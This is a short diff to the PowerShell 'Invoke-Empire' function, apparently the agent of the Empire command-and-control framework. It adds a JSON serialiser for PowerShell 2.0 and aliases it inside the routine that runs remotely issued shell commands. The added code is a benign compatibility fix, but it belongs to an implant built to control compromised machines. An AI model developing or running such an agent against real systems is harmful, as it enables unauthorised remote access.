@@ -258,11 +258,46 @@ function Invoke-Empire {
     #         $Script:ControlServers = $Script:ControlServers + $backup
     #     }
     # }
+    
+    # convert an ps object array to json for powershell 2.0
+    function ConvertObjArrayTo-Json420{
+        #[CmdletBinding()]
+        Param
+        (
+            [Parameter(Mandatory=$true,
+                       ValueFromPipeline=$true,
+                       Position=0)]
+            [object[]]
+            $InputObject
+        )
+
+        BEGIN {
+        $json_string='['
+        }
+        PROCESS {
+            foreach ($obj in $InputObject)
+            {
+               $ht2 = @{}
+               $obj.psobject.properties | Foreach { $ht2[$_.Name] = [string] $_.Value }
+
+               Add-Type -assembly system.web.extensions
+               $JSON = New-Object system.web.script.serialization.javascriptSerializer
+               $json_string = -join( $json_string, $JSON.Serialize($ht2), ',')
+            }
+        }
+        END{
+            $json_string=$json_string.trimend(",")
+            $json_string= -join ($json_string, ']')
+            return $json_string
+        }
+    }
 
     # handle shell commands and return any results
     function Invoke-ShellCommand {
         param($cmd, $cmdargs="")
-
+        If($PSVersionTable.PSVersion.Major -lt 3){
+            New-Alias -Name 'ConvertTo-Json' -Value 'ConvertObjArrayTo-Json420'
+        }    
         # UNC path normalization for PowerShell
         if ($cmdargs -like "*`"\\*") {
             $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\"
